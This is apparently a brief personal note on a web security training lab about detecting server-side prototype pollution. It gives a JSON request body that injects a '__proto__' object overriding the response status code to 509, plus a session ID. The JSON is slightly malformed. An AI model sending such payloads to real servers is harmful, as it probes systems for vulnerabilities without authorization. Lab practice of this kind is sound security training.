@@ -1,0 +1,13 @@
+LAB
+PRACTITIONER
+Detecting server-side prototype pollution without polluted property reflection
+
+
+
+using the method of Status code override:
+
+{"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country ":"777",
+"__proto__": {
+    "status":"509"
+}
+"sessionId":"AfY8obrWcd5oHBKjzn331pVPZnAewXwW"}
